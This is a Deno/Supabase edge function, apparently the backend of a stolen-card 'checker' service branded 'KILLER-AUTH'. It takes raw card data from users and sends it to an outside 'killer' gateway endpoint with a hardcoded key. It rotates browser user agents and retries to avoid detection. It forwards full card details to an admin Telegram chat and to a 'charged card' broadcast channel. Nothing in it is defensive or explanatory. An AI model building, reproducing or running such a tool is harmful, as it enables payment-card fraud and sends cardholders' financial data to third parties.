import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

// Notify charged card (fire-and-forget) - broadcasts to channel
const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      user_id: userId,
      card_details: cardDetails,
      status,
      response_message: responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[KILLER-AUTH] notify-charged-card error:", err));
};

// Send admin debug notification via Telegram (fire-and-forget)
const sendAdminDebug = (cardDetails: string, rawResponse: string) => {
  const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
  const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID");
  
  if (!TELEGRAM_BOT_TOKEN || !ADMIN_TELEGRAM_CHAT_ID) return;

  const message = `🔍 <b>Killer Auth Debug</b>\n\n` +
    `<b>Card:</b> <code>${cardDetails}</code>\n` +
    `<b>Status:</b> UNKNOWN\n\n` +
    `<b>Raw API Response:</b>\n<pre>${rawResponse.substring(0, 3000)}</pre>`;

  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: ADMIN_TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    }),
  }).catch((err) => console.error("[KILLER-AUTH] admin debug error:", err));
};

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

// Determine status from API response - only "KILLED SUCCESSFULLY" means killed
const getStatusFromResponse = (responseText: string): "killed" | "unknown" => {
  // Check for the specific success message
  if (responseText.includes("KILLED SUCCESSFULLY")) {
    return "killed";
  }
  
  // Everything else is UNKNOWN
  return "unknown";
};

// Perform API check with retry logic for UNKNOWN responses
const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown> & { computedStatus: "killed" | "unknown" }> => {
  const maxRetries = 3;
  const apiUrl = `https://killer-2-gates-pyjk.vercel.app/ko/cc=${cc}?key=anmokupvttt`;
  
  console.log(`[KILLER-AUTH] Attempt ${attempt}/${maxRetries} - Calling API:`, apiUrl);

  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
      }
    });
    
    const rawText = await response.text();
    console.log(`[KILLER-AUTH] Attempt ${attempt} - Raw API response:`, rawText);

    // Add our computed status for frontend based on raw text
    const computedStatus = getStatusFromResponse(rawText);
    
    // Check if response is UNKNOWN and should retry
    if (computedStatus === "unknown" && attempt < maxRetries) {
      console.log(`[KILLER-AUTH] UNKNOWN response on attempt ${attempt}, retrying with new user agent...`);
      // Wait before retry (increasing delay)
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
      // Use a different user agent for retry
      const newUserAgent = getRandomUserAgent();
      return performCheck(cc, newUserAgent, attempt + 1);
    }

    // Return with raw response for debugging
    return {
      computedStatus,
      apiStatus: computedStatus === 'killed' ? 'KILLED' : 'UNKNOWN',
      apiMessage: rawText,
      rawResponse: rawText
    };
  } catch (error) {
    console.error(`[KILLER-AUTH] Attempt ${attempt} - Fetch error:`, error);
    
    if (attempt < maxRetries) {
      console.log(`[KILLER-AUTH] Retrying after fetch error...`);
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
      const newUserAgent = getRandomUserAgent();
      return performCheck(cc, newUserAgent, attempt + 1);
    }
    
    const errMsg = error instanceof Error ? error.message : "Unknown fetch error";
    
    return { 
      apiStatus: "ERROR",
      apiMessage: errMsg,
      computedStatus: "unknown"
    };
  }
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // REQUIRE AUTHENTICATION
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // VERIFY USER TOKEN
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // CHECK USER IS NOT BANNED
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned, username")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(
        JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { cc } = await req.json();
    
    if (!cc) {
      return new Response(
        JSON.stringify({ 
          error: 'Card data (cc) is required', 
          computedStatus: 'unknown',
          apiStatus: 'ERROR',
          apiMessage: 'Card data (cc) is required'
        }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const userAgent = getRandomUserAgent();
    console.log('[KILLER-AUTH] Checking card for user:', user.id);
    console.log('[KILLER-AUTH] Using User-Agent:', userAgent);

    // Perform check with automatic retry for UNKNOWN responses
    const data = await performCheck(cc, userAgent);

    // Send admin debug notification for UNKNOWN results only
    if (data.computedStatus === 'unknown') {
      sendAdminDebug(cc, String(data.rawResponse || data.apiMessage || 'No response'));
    }

    // Return without raw response to hide from web UI
    const responseData = {
      computedStatus: data.computedStatus,
      apiStatus: data.apiStatus,
      apiMessage: data.apiMessage
    };

    return new Response(
      JSON.stringify(responseData),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[KILLER-AUTH] Error:', errorMessage);
    
    return new Response(
      JSON.stringify({ 
        error: errorMessage, 
        status: "ERROR",
        computedStatus: "unknown",
        apiStatus: "ERROR",
        apiMessage: errorMessage
      }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
